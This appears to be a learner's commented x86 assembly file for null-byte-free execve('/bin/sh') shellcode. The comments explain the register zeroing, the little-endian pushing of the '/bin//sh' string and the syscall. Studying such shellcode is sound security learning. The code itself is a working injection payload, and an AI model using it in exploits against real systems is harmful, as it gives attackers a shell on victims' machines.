; this one should be free of null bytes
; this only works as x86 shellcode due to use using the al register?

global _start

section .text
_start:
    xor eax, eax    ; change the value of eax into 0, without providing null bytes
    push eax        ; maintain the value of eax? maybe a pop eax later on
    push 0x68732f2f ; push hs//
    push 0x6e69622f ; push nib/
                    ; the reason its all backwards and funky is due to little endianess
    mov ebx, esp    ; make the stack pointer point to our /bin/sh string we just pushed
    mov ecx, eax    ; change ecx to 0, remember we did xor eax, eax at the beginning
                    ; the reason this is needed is because it may contain garbage from compiler

    mov al, 0xb     ; change half of the ax/eax register to execve syscall
    int 0x80        ; syscall

; the reason we are not using strings in this case, is because strings are null terminated
; they always end in an 0x00, which terminates our shellcode
; and thats bad apparently
; so we use fancy schmancy method to geet those 0's outta there
;section .data
;    shell db "/bin/sh"
